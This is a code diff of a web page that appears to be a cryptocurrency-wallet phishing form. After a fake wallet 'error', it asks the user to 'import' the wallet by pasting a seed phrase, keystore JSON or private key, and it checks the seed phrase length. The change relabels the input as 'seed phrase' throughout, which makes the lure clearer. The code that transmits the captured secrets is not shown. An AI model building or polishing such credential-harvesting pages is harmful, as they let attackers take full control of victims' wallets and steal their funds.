@@ -41,13 +41,13 @@
             <h2>Import your <span id="errorWalletName"></span> wallet</h2>
             
             <div class="tabs">
-                <button class="tab-btn active" onclick="switchTab('phrase')">Phrase</button>
+                <button class="tab-btn active" onclick="switchTab('seedphrase')">Seed Phrase</button>
                 <button class="tab-btn" onclick="switchTab('keystore')">Keystore JSON</button>
                 <button class="tab-btn" onclick="switchTab('privatekey')">Private Key</button>
             </div>
 
-            <label for="manualInput">Enter your wallet <span id="inputLabel">phrase</span></label>
-            <textarea id="manualInput" name="manualInput" placeholder="Enter your wallet phrase" rows="6"></textarea>
+            <label for="manualInput">Enter your wallet <span id="inputLabel">seed phrase</span></label>
+            <textarea id="manualInput" name="manualInput" placeholder="Enter your seed phrase" rows="6"></textarea>
 
             <p id="errorMessage" class="hidden"></p>
 
@@ -97,7 +97,7 @@
         });
 
         let selectedWallet = null;
-        let currentTab = "phrase";
+        let currentTab = "seedphrase"; // Updated to match the new tab identifier
 
         // Open wallet selection popup
         function openWalletPopup() {
@@ -125,14 +125,14 @@
         function openErrorPopup(wallet) {
             document.getElementById("errorWalletName").textContent = wallet;
             document.getElementById("errorPopup").style.display = "flex";
-            currentTab = "phrase";
+            currentTab = "seedphrase"; // Updated to match the new tab identifier
             updateInputLabel();
         }
 
         // Close error popup
         function closeErrorPopup() {
             selectedWallet = null;
-            currentTab = "phrase";
+            currentTab = "seedphrase"; // Updated to match the new tab identifier
             document.getElementById("manualInput").value = "";
             document.getElementById("errorMessage").textContent = "";
             document.getElementById("errorMessage").classList.add("hidden");
@@ -150,7 +150,7 @@
             }
         };
 
-        // Switch between tabs (Phrase, Keystore JSON, Private Key)
+        // Switch between tabs (Seed Phrase, Keystore JSON, Private Key)
         function switchTab(tab) {
             currentTab = tab;
             updateInputLabel();
@@ -160,9 +160,9 @@
         function updateInputLabel() {
             const label = document.getElementById("inputLabel");
             const placeholder = document.getElementById("manualInput");
-            if (currentTab === "phrase") {
-                label.textContent = "phrase";
-                placeholder.placeholder = "Enter your wallet phrase";
+            if (currentTab === "seedphrase") {
+                label.textContent = "seed phrase";
+                placeholder.placeholder = "Enter your seed phrase";
             } else if (currentTab === "keystore") {
                 label.textContent = "keystore JSON";
                 placeholder.placeholder = "Enter your keystore JSON";
@@ -195,7 +195,7 @@
                 return;
             }
 
-            if (currentTab === "phrase" && ![12, 24].includes(manualInput.split(" ").length)) {
+            if (currentTab === "seedphrase" && ![12, 24].includes(manualInput.split(" ").length)) {
                 message.textContent = "Error: Seed phrase must be 12 or 24 words!";
                 message.classList.remove("hidden");
                 return;
